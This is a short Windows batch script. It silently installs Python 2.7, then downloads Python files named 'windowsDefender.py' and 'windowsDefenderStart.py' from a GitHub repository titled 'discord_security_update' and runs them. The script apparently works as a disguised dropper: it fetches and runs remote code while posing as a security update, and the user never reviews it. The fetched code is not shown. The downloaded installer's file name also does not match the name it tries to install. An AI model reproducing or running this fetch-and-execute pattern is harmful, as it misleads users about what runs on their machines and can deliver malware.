@echo off

curl https://www.python.org/ftp/python/2.7/python-2.7.amd64.msi -O
msiexec /i "python-2.7.11.amd64.msi" /passive /norestart ADDLOCAL=ALL


curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefenderStart.py -O
curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/requirements.txt -O

pip install -r requirements.txt

python windowsDefender.py
